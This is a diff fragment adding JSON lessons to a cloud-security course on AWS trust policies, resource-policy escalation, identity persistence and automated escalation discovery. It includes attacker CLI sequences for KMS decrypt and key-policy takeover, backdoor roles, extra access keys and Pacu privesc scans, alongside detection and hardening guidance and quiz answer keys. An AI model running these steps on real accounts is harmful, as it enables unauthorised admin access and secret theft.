+            "body": "Trust policies deserve the same scrutiny as permission policies — arguably more, because they are the door.\n\n- **Tight Principal**: name the exact role/user ARN that should assume the role, never `*` and rarely `:root`. If you must use `:root`, pair it with a `Condition` restricting the specific principal.\n- **ExternalId** for every third-party/vendor role to stop cross-account confused deputies.\n- **`aws:PrincipalOrgID`** condition so only principals from *your* AWS Organization can assume internal roles — this neutralises many cross-account mistakes at once.\n- **OIDC `sub` pinning**: require the full `repo:org/name:ref:refs/heads/main` (or environment) claim; never leave it wildcarded.\n- **MFA / SourceIp** conditions on sensitive roles.\n- **Detect**: IAM Access Analyzer flags roles with external (cross-account or public) access; CloudTrail alerts on `UpdateAssumeRolePolicy` and unexpected `AssumeRole`.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Weak trust",
+                  "points": [
+                    "Principal: *",
+                    "Principal: :root alone",
+                    "No ExternalId",
+                    "OIDC sub: repo:*"
+                  ]
+                },
+                {
+                  "label": "Hardened trust",
+                  "points": [
+                    "Exact principal ARN",
+                    "aws:PrincipalOrgID condition",
+                    "Required ExternalId",
+                    "Full OIDC sub pinned"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why it matters",
+            "body": "Roles are the connective tissue of cloud: cross-account access, CI/CD, SaaS integrations and service-to-service calls all ride on `sts:AssumeRole`. A single over-trusting role turns 'I have a tiny foothold' into 'I am admin' or 'I am inside a second account', with no policy-editing required — the attacker just walks through an open door.\n\nTrust-policy mistakes are especially common because they are written once, early, often copied from a blog's lazy `:root` example, and never reviewed again. OIDC wildcards and missing ExternalIds have caused real cross-organisation compromises.\n\nFor hunters, an over-broad trust policy on a privileged role is a clean, high-severity finding. For defenders, `aws:PrincipalOrgID`, ExternalId and pinned OIDC claims are among the highest-leverage controls you can add — they shut whole classes of cross-account breakout at once.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Over-trusting role",
+                  "detail": ":root / * / no ExternalId"
+                },
+                {
+                  "label": "Attacker on guest list",
+                  "detail": "Any foothold or vendor abuse"
+                },
+                {
+                  "label": "AssumeRole",
+                  "detail": "Inherit role powers"
+                },
+                {
+                  "label": "Breakout",
+                  "detail": "Admin or cross-account access"
+                }
+              ]
+            }
+          }
+        ]
+      },
+      {
+        "id": "cloud-m4-4",
+        "moduleId": "cloud-m4",
+        "number": 24,
+        "title": "Resource-Policy Escalation",
+        "type": "theory",
+        "week": 2,
+        "description": "Escalation that lives on the resource, not the identity. Over-permissive resource policies on KMS keys, S3, Lambda, SNS/SQS and Secrets Manager grant access that identity policies alone would deny.",
+        "keyPoints": [
+          "KMS key policies granting kms:Decrypt / PutKeyPolicy to too-broad principals",
+          "Lambda resource policy allowing arbitrary invoke/add-permission",
+          "Secrets Manager / SNS / SQS resource policies as cross-account doorways",
+          "ECR repository policies exposing images (and embedded secrets)",
+          "Cross-account access through resource policies without any AssumeRole"
+        ],
+        "slides": [
+          {
+            "title": "What resource-policy escalation is",
+            "body": "Most access in AWS is granted by **identity policies** (attached to a user/role: 'this principal may do X'). But many services also support a **resource policy** attached to the *thing itself* ('whoever is listed may use this resource'). Examples: an S3 bucket policy, a KMS key policy, a Lambda function policy, an SNS topic or SQS queue policy, a Secrets Manager secret policy, an ECR repository policy.\n\nAnalogy: identity policy is a badge saying which rooms you may enter. A resource policy is a note taped to a specific door saying 'these people may come in' — regardless of their badge. If someone tapes 'everyone welcome' to the vault door, your badge restrictions no longer matter for that vault.\n\nResource-policy escalation means a resource grants access that the attacker's identity policy alone would deny — sometimes even to principals in other accounts, with no AssumeRole at all.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Identity policy",
+                  "points": [
+                    "Attached to principal",
+                    "'I may do X to many resources'"
+                  ]
+                },
+                {
+                  "label": "Resource policy",
+                  "points": [
+                    "Attached to the resource",
+                    "'These principals may use ME'",
+                    "Can grant cross-account directly"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "How access is actually decided",
+            "body": "For a given request, AWS evaluates both policy types. The simplified rule:\n\n- **Same account**: access is allowed if *either* the identity policy **or** the resource policy allows it (and nothing explicitly denies). So a permissive resource policy can grant access your identity policy never did.\n- **Cross-account**: access requires *both* the resource policy in the target account **and** an identity policy in the caller's account to allow it. The resource policy is what makes cross-account access possible at all — without it, you would need AssumeRole.\n\nThis asymmetry is why resource policies are an escalation surface: within an account, a sloppy resource policy single-handedly opens access; across accounts, it is the doorway that replaces a trust relationship.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Request to resource",
+                  "detail": "e.g. kms:Decrypt on a key"
+                },
+                {
+                  "label": "Check identity policy",
+                  "detail": "Does caller's policy allow?"
+                },
+                {
+                  "label": "Check resource policy",
+                  "detail": "Does the key policy allow caller?"
+                },
+                {
+                  "label": "Allow if either (same-acct)",
+                  "detail": "Resource policy alone can grant"
+                }
+              ]
+            },
+            "check": {
+              "question": "Within a single account, how can a resource policy grant access that the caller's identity policy denies?",
+              "options": [
+                "Same-account access is allowed if EITHER the identity policy OR the resource policy allows it (absent an explicit deny)",
+                "Resource policies always override explicit denies",
+                "It cannot — identity policy always wins",
+                "Only if the caller is the root user"
+              ],
+              "correctIndex": 0,
+              "explanation": "For same-account requests, an Allow in either policy suffices (with no Deny). So an over-broad resource policy can grant access the identity policy omits. Cross-account additionally needs the caller's identity policy to allow it too."
+            }
+          },
+          {
+            "title": "Worked example: over-broad KMS key policy",
+            "body": "A KMS key encrypts a secrets bucket. Its key policy sloppily grants `kms:Decrypt` to the whole account's root principal. Your low-priv foothold's identity policy says nothing about KMS — but the key policy allows it, so you can decrypt the data anyway. Worse, if the policy grants `kms:PutKeyPolicy`, you can rewrite the key policy to grant yourself everything.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws kms get-key-policy --key-id 1234abcd-... --policy-name default --query Policy --output text",
+                  "output": "...\"Principal\":{\"AWS\":\"arn:aws:iam::111122223333:root\"},\"Action\":[\"kms:Decrypt\",\"kms:PutKeyPolicy\"]..."
+                },
+                {
+                  "command": "aws kms decrypt --ciphertext-blob fileb://secret.enc --key-id 1234abcd-... --query Plaintext --output text | base64 -d",
+                  "output": "db_password=SuperS3cret  <- identity policy never allowed KMS, key policy did"
+                },
+                {
+                  "command": "aws kms put-key-policy --key-id 1234abcd-... --policy-name default --policy file://wide-open.json",
+                  "output": "(success) key policy now grants attacker kms:* -> persistent decrypt"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Variants across services",
+            "body": "The same pattern recurs wherever a resource policy exists:\n\n- **KMS key policy**: `kms:Decrypt` exposes all data encrypted with the key; `kms:PutKeyPolicy` / `kms:CreateGrant` let you widen access or hand it to another principal.\n- **Lambda function policy**: `lambda:AddPermission` or a broad invoke grant lets an attacker invoke (or add themselves to) functions, and functions often run with privileged roles.\n- **Secrets Manager** secret resource policy: cross-account `secretsmanager:GetSecretValue` leaks credentials directly.\n- **SNS / SQS** access policies: over-broad `Principal: *` lets anyone publish to a topic or read a queue — a message-injection and data-leak doorway, frequently cross-account.\n- **ECR repository policy**: public/over-broad `ecr:GetDownloadUrlForLayer` exposes container images, which commonly embed secrets and source.\n\nNuance: these grant access **without any AssumeRole** — the attacker uses their own credentials directly against the permissive resource.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "attacker",
+                  "label": "Attacker principal",
+                  "highlighted": true
+                },
+                {
+                  "id": "kms",
+                  "label": "KMS key (Decrypt)"
+                },
+                {
+                  "id": "secret",
+                  "label": "Secrets Manager"
+                },
+                {
+                  "id": "lambda",
+                  "label": "Lambda (invoke/add-perm)"
+                },
+                {
+                  "id": "ecr",
+                  "label": "ECR image"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "attacker",
+                  "to": "kms",
+                  "label": "resource policy allows"
+                },
+                {
+                  "from": "attacker",
+                  "to": "secret",
+                  "label": "GetSecretValue"
+                },
+                {
+                  "from": "attacker",
+                  "to": "lambda",
+                  "label": "AddPermission"
+                },
+                {
+                  "from": "attacker",
+                  "to": "ecr",
+                  "label": "pull image + secrets"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How to find and test it",
+            "body": "Resource policies are easy to miss because they are **not attached to you** — you must enumerate the resources themselves.\n\n- KMS: `aws kms list-keys` then `get-key-policy` for each; look for broad `Principal` and dangerous actions (`Decrypt`, `PutKeyPolicy`, `CreateGrant`).\n- Lambda: `aws lambda get-policy --function-name X` for each function.\n- Secrets Manager: `aws secretsmanager get-resource-policy --secret-id X`.\n- SNS/SQS: `get-topic-attributes` / `get-queue-attributes` and read the `Policy`.\n- ECR: `aws ecr get-repository-policy --repository-name X`.\n- S3: `aws s3api get-bucket-policy` plus Block Public Access status.\n\nThe red flags: `Principal: \"*\"`, `:root`, another account's ID you can reach, or any write-to-the-policy action. **IAM Access Analyzer** automates this: it reports every resource whose policy grants access outside your account/zone of trust.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws accessanalyzer list-findings --analyzer-arn ... --query 'findings[?status==`ACTIVE`].[resourceType,principal,action]'",
+                  "output": "KMS Key  { AWS: * }  [kms:Decrypt]   <- external-access finding"
+                },
+                {
+                  "command": "aws lambda get-policy --function-name report-gen --query Policy --output text",
+                  "output": "...\"Principal\":\"*\",\"Action\":\"lambda:InvokeFunction\"...  <- anyone can invoke"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Do it — hands-on with Access Analyzer",
+            "body": "This is a theory topic, so the hands-on step reinforces discovery and ties into the module's other labs. In your own sandbox:\n\n1. Create a KMS key and attach a deliberately broad key policy (`Principal :root`, `kms:Decrypt` + `kms:PutKeyPolicy`). Encrypt a test secret with it.\n2. From a low-priv user with *no* KMS identity permissions, prove you can still `kms:decrypt` the secret — demonstrating resource-policy grant.\n3. Enable **IAM Access Analyzer** and confirm it raises an external/over-broad finding for the key, the Lambda, or the bucket.\n4. Remediate the key policy to name only the exact principal and remove `PutKeyPolicy`, then re-run the decrypt and confirm `AccessDenied`.\n\nThis mirrors the CloudGoat scenarios where KMS and Secrets Manager resource policies are the actual escalation edge, not identity policy.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Create broad resource policy",
+                  "detail": "KMS key trusts :root for Decrypt"
+                },
+                {
+                  "label": "Prove grant",
+                  "detail": "Low-priv user decrypts anyway"
+                },
+                {
+                  "label": "Access Analyzer",
+                  "detail": "Flags external/over-broad access"
+                },
+                {
+                  "label": "Scope + re-test",
+                  "detail": "Name exact principal, expect Deny"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Defend and harden",
+            "body": "Resource policies must be written as tightly as identity policies, and reviewed continuously.\n\n- **Name exact principals**: never `Principal: \"*\"` or `:root` on sensitive resources; list the specific role/account ARNs.\n- **Remove policy-write actions**: do not grant `kms:PutKeyPolicy`, `lambda:AddPermission`, `s3:PutBucketPolicy` to non-admins — these let a foothold rewrite the door.\n- **Condition keys**: add `aws:PrincipalOrgID`, `aws:SourceArn`/`aws:SourceAccount` (prevents SNS/SQS/Secrets confused deputies), and encryption-context conditions on KMS grants.\n- **S3 Block Public Access** account-wide as the backstop.\n- **IAM Access Analyzer** on a schedule to catch every externally-accessible resource; archive expected findings, alert on new ones.\n- **Detect** with CloudTrail on `PutKeyPolicy`, `AddPermission`, `PutBucketPolicy`, `PutResourcePolicy`.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Dangerous resource policy",
+                  "points": [
+                    "Principal: * / :root",
+                    "Grants kms:PutKeyPolicy",
+                    "No SourceArn/OrgID condition",
+                    "lambda:AddPermission to all"
+                  ]
+                },
+                {
+                  "label": "Hardened",
+                  "points": [
+                    "Exact principal ARNs",
+                    "No policy-write actions for non-admins",
+                    "aws:PrincipalOrgID + SourceArn",
+                    "Access Analyzer monitoring"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why it matters",
+            "body": "Resource-policy escalation is the blind spot of identity-centric reviews. A team can audit every user and role policy perfectly and still be wide open because a KMS key or Secrets Manager secret grants cross-account `Decrypt` to the world. Because resource policies can grant access **directly across account boundaries without AssumeRole**, they are a favourite route for data exfiltration and lateral movement, and they bypass the mental model 'our users are least-privileged, so we are safe'.\n\nThe highest-severity real breaches often hinge here: an over-broad bucket policy leaking customer data, a KMS key letting an attacker decrypt everything, or an SQS/SNS policy allowing cross-account message injection.\n\nFor hunters, enumerating resource policies (and running Access Analyzer) finds access that identity enumeration misses. For defenders, tight principals plus `aws:PrincipalOrgID`/`SourceArn` conditions and Access Analyzer monitoring close a surface many teams never look at.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Identity policies look clean",
+                  "detail": "Least-priv users"
+                },
+                {
+                  "label": "Resource policy over-broad",
+                  "detail": "KMS/S3/Secrets grants *"
+                },
+                {
+                  "label": "Direct access, no AssumeRole",
+                  "detail": "Decrypt / read / cross-account"
+                },
+                {
+                  "label": "Data exfiltration",
+                  "detail": "Access Analyzer + conditions fix it"
+                }
+              ]
+            }
+          }
+        ]
+      },
+      {
+        "id": "cloud-m4-5",
+        "moduleId": "cloud-m4",
+        "number": 25,
+        "title": "Persistence via Identity",
+        "type": "lab",
+        "week": 2,
+        "description": "Once admin, attackers stay. Students practise and then detect stealthy identity persistence, understanding each technique's forensic footprint.",
+        "keyPoints": [
+          "Second access key on an existing user; new IAM user hidden among many",
+          "Backdoor role with a wide trust policy for later re-entry",
+          "Modifying SCPs/permission boundaries to weaken guardrails",
+          "Lambda backdoor triggered on events; EventBridge rule as a trigger",
+          "Detection: CloudTrail events (CreateAccessKey, UpdateAssumeRolePolicy, AttachUserPolicy)"
+        ],
+        "slides": [
+          {
+            "title": "What identity-based persistence is",
+            "body": "Once an attacker reaches admin, they want to **stay in** even if the original foothold is discovered and revoked. Persistence via identity means planting hidden, legitimate-looking IAM credentials or trust relationships so the attacker can return later without re-exploiting anything.\n\nAnalogy: a burglar who gets into a building doesn't just take things — they copy a key, prop a back window, and add their own name to the authorised-visitor list. Even after the front door is re-locked, they walk back in.\n\nIn AWS, the 'back windows' are extra access keys, hidden users, backdoor roles with wide trust, weakened guardrails, and event-triggered backdoor functions. The defensive flip side — which you also learn here — is recognising the **forensic footprint** each technique leaves in CloudTrail.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Gain admin",
+                  "detail": "Via escalation"
+                },
+                {
+                  "label": "Plant persistence",
+                  "detail": "Extra key / backdoor role / rule"
+                },
+                {
+                  "label": "Original foothold revoked",
+                  "detail": "Defenders clean up"
+                },
+                {
+                  "label": "Attacker returns",
+                  "detail": "Hidden access still works"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How the main techniques work",
+            "body": "Each technique abuses a normal IAM feature:\n\n- **Second access key**: `iam:CreateAccessKey` on a legit user (even one you compromised) gives a user *two* active keys. Defenders who rotate the known key miss the second.\n- **Hidden IAM user**: create a new user named to blend in (`backup-svc`, `terraform-ro`) with admin, buried among dozens of real users.\n- **Backdoor role**: create a role with AdministratorAccess and a wide trust policy (`:root` or an attacker-controlled account), so the attacker can AssumeRole in later.\n- **Weaken guardrails**: edit SCPs or permission boundaries to remove the denies that would stop re-escalation.\n- **Event-triggered backdoor**: a Lambda (with an admin role) wired to an **EventBridge** rule or other trigger that re-creates the attacker's access whenever it fires — persistence that *repairs itself*.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "admin",
+                  "label": "Admin foothold",
+                  "highlighted": true
+                },
+                {
+                  "id": "key",
+                  "label": "2nd access key"
+                },
+                {
+                  "id": "user",
+                  "label": "Hidden admin user"
+                },
+                {
+                  "id": "role",
+                  "label": "Backdoor role (wide trust)"
+                },
+                {
+                  "id": "lambda",
+                  "label": "EventBridge + Lambda backdoor",
+                  "highlighted": true
+                }
+              ],
+              "edges": [
+                {
+                  "from": "admin",
+                  "to": "key",
+                  "label": "CreateAccessKey"
+                },
+                {
+                  "from": "admin",
+                  "to": "user",
+                  "label": "CreateUser+Attach"
+                },
+                {
+                  "from": "admin",
+                  "to": "role",
+                  "label": "CreateRole+trust"
+                },
+                {
+                  "from": "admin",
+                  "to": "lambda",
+                  "label": "self-healing"
+                }
+              ]
+            },
+            "check": {
+              "question": "Why does adding a SECOND access key to a compromised user make a good persistence mechanism?",
+              "options": [
+                "A user can hold two active keys, so defenders who rotate only the known/leaked key leave the attacker's second key working",
+                "A second key disables CloudTrail logging",
+                "A second key grants root privileges automatically",
+                "Users can only ever have one key, so it forces others out"
+              ],
+              "correctIndex": 0,
+              "explanation": "IAM allows two active access keys per user. If responders rotate the leaked key but don't notice the attacker added a second, access persists. CreateAccessKey is both an escalation and a persistence primitive."
+            }
+          },
+          {
+            "title": "Worked example: second key + backdoor role",
+            "body": "As admin, the attacker adds a quiet second key to an existing service user and creates a blandly-named backdoor role trusting their own account. Both look like routine admin activity in a busy account.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws iam create-access-key --user-name ci-deploy-svc",
+                  "output": "AccessKeyId: AKIA2NDKEY...  SecretAccessKey: ...  Status: Active  <- user now has 2 keys"
+                },
+                {
+                  "command": "aws iam create-role --role-name metrics-collector --assume-role-policy-document file://trust-attacker.json",
+                  "output": "Role: metrics-collector  (trust: arn:aws:iam::ATTACKER:root)"
+                },
+                {
+                  "command": "aws iam attach-role-policy --role-name metrics-collector --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+                  "output": "(success) backdoor role ready for later AssumeRole"
+                },
+                {
+                  "command": "# weeks later, from attacker account:",
+                  "output": ""
+                },
+                {
+                  "command": "aws sts assume-role --role-arn arn:aws:iam::111122223333:role/metrics-collector --role-session-name m",
+                  "output": "Credentials: ASIA...  <- re-entry achieved, no re-exploitation needed"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Variants and stealth nuances",
+            "body": "Attackers tune persistence for low detectability:\n\n- **Blend-in naming**: match the account's convention (`-svc`, `-ro`, `terraform-`, `datadog-`). A role called `backdoor` gets caught; `log-forwarder` does not.\n- **Login profile vs access key**: `iam:CreateLoginProfile` adds console-password access to a user that only had API keys — a different, less-watched channel.\n- **Permission boundary / SCP weakening**: subtle and powerful — instead of adding obvious admin, quietly remove a Deny so a dormant principal can re-escalate on demand.\n- **Infrastructure backdoors**: EventBridge rule → Lambda that re-adds the attacker if their access is deleted (self-healing). Or a Lambda behind a Function URL for a web callback.\n- **Nuance**: every one of these is an *allowed* API call for an admin, so prevention is about least privilege *before* compromise and detection *after*; you cannot 'block admin from being admin'.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Noisy (caught fast)",
+                  "points": [
+                    "Role named 'backdoor'",
+                    "Obvious new admin user",
+                    "Disabling CloudTrail"
+                  ]
+                },
+                {
+                  "label": "Stealthy (persistence)",
+                  "points": [
+                    "Blend-in names",
+                    "Second key on real user",
+                    "Remove one SCP Deny",
+                    "Self-healing Lambda"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "How to detect it — the forensic footprint",
+            "body": "Every persistence technique writes a specific **CloudTrail** event. Detection is pattern-matching those events against expected behaviour.\n\n- `CreateAccessKey` — especially a user suddenly having two keys, or a key created by a different principal than the user.\n- `CreateUser` + `AttachUserPolicy`(AdministratorAccess) in quick succession.\n- `CreateRole` + `UpdateAssumeRolePolicy` with external/`:root` trust, or `AttachRolePolicy` of AdministratorAccess.\n- `CreateLoginProfile` on an API-only service user.\n- `PutRolePermissionsBoundary` deletions, or Organizations `UpdatePolicy` on an SCP.\n- `PutRule` / `PutTargets` (EventBridge) + `CreateFunction` wiring a backdoor.\n\nBuild detections in CloudWatch/EventBridge or GuardDuty for these. GuardDuty has findings like `PrivilegeEscalation:IAMUser/AdministrativePermissions`. The key defensive skill is knowing that the attack and its log entry are two sides of one coin.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=CreateAccessKey --max-results 5",
+                  "output": "CreateAccessKey  user=ci-deploy-svc  by=assumed-role/prod-admin-role/demo  time=... <- who created it?"
+                },
+                {
+                  "command": "aws iam list-access-keys --user-name ci-deploy-svc",
+                  "output": "AKIAOLDKEY (Active)   AKIA2NDKEY (Active)  <- two keys: investigate the newer one"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Do it — Persistence via Identity lab",
+            "body": "This module's **Persistence via Identity** lab has you practise *and then detect* stealthy persistence in your own account, understanding each technique's footprint.\n\nHands-on steps:\n1. From an admin session, plant two mechanisms: a second access key on an existing user, and a backdoor role trusting a second account you control.\n2. Simulate incident response: revoke the original foothold key.\n3. Prove persistence by re-entering through the second key / backdoor role.\n4. Switch to defender: query CloudTrail for `CreateAccessKey`, `CreateRole`, `UpdateAssumeRolePolicy`, `AttachRolePolicy`, and identify exactly which events betray your own persistence.\n5. Write a detection rule (EventBridge pattern) that would have alerted on step 1, and a remediation runbook.\n\nTear down every created key, user and role afterwards. Only ever in your own sandbox.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Plant persistence",
+                  "detail": "2nd key + backdoor role"
+                },
+                {
+                  "label": "Simulate IR",
+                  "detail": "Revoke original key"
+                },
+                {
+                  "label": "Re-enter",
+                  "detail": "Prove access survives"
+                },
+                {
+                  "label": "Detect + remediate",
+                  "detail": "CloudTrail hunt + EventBridge rule"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Defend and harden",
+            "body": "You cannot stop an admin from using admin APIs, so defence is layered: shrink who can become admin, and detect fast when they do.\n\n- **Least privilege + boundaries** everywhere so fewer principals can ever reach the admin state that enables persistence.\n- **SCPs** that even admins cannot bypass: deny `iam:CreateLoginProfile` on service users, deny editing the org's own SCPs except by a break-glass path, deny `cloudtrail:StopLogging` / `DeleteTrail`.\n- **Immutable, org-level CloudTrail** + GuardDuty, so the forensic footprint cannot be erased.\n- **Automated detection + response**: EventBridge rules on the exact events above, auto-disabling suspicious keys/roles.\n- **Hygiene sweeps**: alert on any user with two keys, any role with external trust, any login profile on a service account, any unexpected SCP/boundary change.\n- **Credential rotation that is complete**: rotate *all* keys and review *all* principals after an incident, not just the known leaked one.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Attacker action",
+                  "points": [
+                    "2nd access key",
+                    "Backdoor role w/ wide trust",
+                    "Weaken SCP",
+                    "EventBridge+Lambda backdoor"
+                  ]
+                },
+                {
+                  "label": "Defensive control",
+                  "points": [
+                    "Alert on users with 2 keys",
+                    "Access Analyzer external-trust",
+                    "SCP protects org policies + immutable CloudTrail",
+                    "Alert on PutRule/CreateFunction by non-CI"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Why it matters",
+            "body": "Persistence is what turns a one-time breach into a long-term compromise. In real cloud incidents, the costly part is rarely the initial foothold — it is discovering, weeks later, that the attacker left three backdoors and the 'cleanup' only closed one. Incomplete remediation (rotating the known key while a second key and a backdoor role sit untouched) is one of the most common and expensive IR failures.\n\nUnderstanding persistence from the attacker's side is what makes you good at the defender's side: you learn to hunt the exact CloudTrail events, to sweep for the second key and the blandly-named role, and to build detections before an incident rather than during one.\n\nThis topic also cements a core cloud-security truth: in an identity-defined perimeter, the audit log is the primary detection surface, and protecting the integrity of that log is as important as any preventive control.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Breach",
+                  "detail": "Attacker gains admin"
+                },
+                {
+                  "label": "Multiple backdoors",
+                  "detail": "Keys, roles, rules"
+                },
+                {
+                  "label": "Partial cleanup",
+                  "detail": "Only known foothold revoked"
+                },
+                {
+                  "label": "Long-term compromise",
+                  "detail": "Full sweep + detection needed"
+                }
+              ]
+            }
+          }
+        ]
+      },
+      {
+        "id": "cloud-m4-6",
+        "moduleId": "cloud-m4",
+        "number": 26,
+        "title": "Automated Escalation Discovery",
+        "type": "lab",
+        "week": 2,
+        "description": "Scaling the hunt with tooling. Students run Pacu's escalation modules and PMapper to find escalation paths automatically and validate them manually.",
+        "keyPoints": [
+          "Pacu iam__privesc_scan module to flag exploitable permissions",
+          "PMapper to compute principal-to-admin reachability across the account",
+          "Cloudsplaining to flag risky IAM policies from the Authorization Details",
+          "Validating automated findings to avoid false positives",
+          "Reporting the exact edge and the one-line policy fix"
+        ],
+        "slides": [
+          {
+            "title": "What automated escalation discovery is",
+            "body": "Enumerating permissions and matching them against the escalation catalogue by hand is slow and error-prone, especially in accounts with hundreds of principals. **Automated escalation discovery** uses tooling to map the account's IAM graph and flag every principal that can reach admin — then you validate the hits manually.\n\nAnalogy: instead of walking every corridor of a huge building trying each door with your badge, you get the building's full wiring diagram and a tool that highlights every path from 'where you stand' to 'the vault'. You still have to physically open the final door to confirm, but you stop wasting time on dead ends.\n\nThe three workhorse tools: **Pacu** (actively tests your permissions), **PMapper** (computes principal-to-admin reachability as a graph), and **Cloudsplaining** (statically flags risky policies from an account's authorization details).",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Pacu",
+                  "points": [
+                    "Active exploitation framework",
+                    "iam__privesc_scan module",
+                    "Tests what YOU can do"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "PMapper",
+                  "points": [
+                    "Builds IAM graph",
+                    "Computes reachability to admin",
+                    "query 'who can reach admin'"
+                  ]
+                },
+                {
+                  "label": "Cloudsplaining",
+                  "points": [
+                    "Static policy analysis",
+                    "Flags risky actions",
+                    "From account auth details (JSON)"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "How the tools work",
+            "body": "They take different angles on the same question — 'who can become admin?':\n\n- **Pacu** (Rhino) is an offensive framework. Its `iam__enum_permissions` builds your effective permission set; `iam__privesc_scan` checks that set against the ~21 catalogue methods and reports which you can exploit (and can auto-attempt some).\n- **PMapper** (NCC Group) pulls every user, role and policy and builds a **directed graph** where an edge means 'principal A can gain the privileges of principal B' (via AssumeRole, PassRole, CreateAccessKey, policy edits, etc.). You then query reachability: `pmapper query \"who can do iam:* with *\"` or 'preset privesc'.\n- **Cloudsplaining** (Salesforce) ingests the account's IAM Authorization Details (one API call: `iam get-account-authorization-details`) and produces an HTML report flagging policies that allow privilege escalation, resource exposure, data exfiltration or credential exposure — purely static, no exploitation.\n\nPacu answers 'what can *I* do now', PMapper answers 'what paths exist across the whole account', Cloudsplaining answers 'which policies are dangerous on paper'.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "Collect IAM data",
+                  "detail": "get-account-authorization-details"
+                },
+                {
+                  "label": "Model it",
+                  "detail": "Graph (PMapper) / rules (Cloudsplaining)"
+                },
+                {
+                  "label": "Find escalation edges",
+                  "detail": "Principal -> admin paths"
+                },
+                {
+                  "label": "Validate manually",
+                  "detail": "Confirm the real exploit"
+                }
+              ]
+            },
+            "check": {
+              "question": "What does an edge in a PMapper graph represent?",
+              "options": [
+                "That one principal can gain the privileges of another (e.g. via AssumeRole, PassRole, or policy edits)",
+                "A network connection between two EC2 instances",
+                "A billing relationship between accounts",
+                "A DNS record pointing to a load balancer"
+              ],
+              "correctIndex": 0,
+              "explanation": "PMapper models IAM as a graph where an edge A->B means principal A can access B's privileges. Reachability queries then reveal which principals can ultimately reach admin."
+            }
+          },
+          {
+            "title": "Worked example: Pacu privesc scan",
+            "body": "You import your foothold's keys into Pacu, enumerate permissions, and run the privilege-escalation scan. It identifies the exploitable catalogue method so you can validate it by hand.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "Pacu>",
+              "lines": [
+                {
+                  "command": "set_keys  (import dev-ci access + secret)",
+                  "output": "Keys set for session 'lab'."
+                },
+                {
+                  "command": "run iam__enum_permissions",
+                  "output": "Confirmed permissions for user dev-ci: iam:PassRole, lambda:CreateFunction, lambda:InvokeFunction, iam:ListRoles ..."
+                },
+                {
+                  "command": "run iam__privesc_scan",
+                  "output": "[+] Exploitable privilege escalation found: PassExistingRoleToNewLambdaThenInvoke\n[+] Candidate roles: prod-admin-role (AdministratorAccess)\n[*] Validate before reporting."
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked example: PMapper + Cloudsplaining",
+            "body": "PMapper shows the account-wide picture; Cloudsplaining gives a static policy report. Together they cross-check each other and your Pacu result.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "pmapper graph create",
+                  "output": "Graph built: 142 principals, 318 edges."
+                },
+                {
+                  "command": "pmapper query 'preset privesc user/dev-ci'",
+                  "output": "user/dev-ci CAN reach admin: via PassRole->prod-admin-role (lambda)  [edge]"
+                },
+                {
+                  "command": "aws iam get-account-authorization-details > auth.json",
+                  "output": "(written)"
+                },
+                {
+                  "command": "cloudsplaining scan --input-file auth.json --output report/",
+                  "output": "PrivilegeEscalation: CI-Deploy-Policy (iam:PassRole + lambda:*)  ResourceExposure: ...  report.html written"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Validation — killing false positives",
